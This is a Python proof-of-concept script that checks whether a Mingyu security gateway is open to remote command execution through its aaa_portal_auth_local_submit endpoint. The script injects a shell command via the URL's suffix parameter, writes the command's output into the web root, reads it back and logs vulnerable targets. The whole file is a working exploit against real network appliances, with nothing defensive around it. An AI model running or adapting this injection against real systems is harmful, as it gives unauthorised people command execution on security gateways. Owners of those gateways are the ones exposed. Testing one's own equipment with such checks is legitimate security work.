import requests
import time

import buter
import wirtefile

filename = "./reps/明御安全网关_aaa_portal_auth_local_submit_RCE-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def ahmyaaa(url):
    try:
        exploit_url = f"{url}/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id+>/usr/local/webui/test1.txt`)}}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/35.0.1916.47 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip",
        }
        with requests.Session() as session:
            response = session.get(exploit_url,headers=headers,timeout=3)
            if response.status_code == 200 and "\"success\":\"local_logo\"" in response.text:
                print(buter.colors.GREEN+ f"存在明御安全网关_aaa_portal_auth_local_submit_RCE url : {url}/webui/test1.txt" + buter.colors.END)
                rep = requests.get(url=url+"/test1.txt",headers=headers,timeout=3)
                print(rep.text)
                wirtefile.writefiles(filename,rep.url)
            else:
                pass
                print(buter.colors.RED+ f"未发现明御安全网关_aaa_portal_auth_local_submit_RCE url : {url}" +buter.colors.END )
    except Exception as e:
        print(buter.colors.END + f"ERROR : {e}" + buter.colors.END)
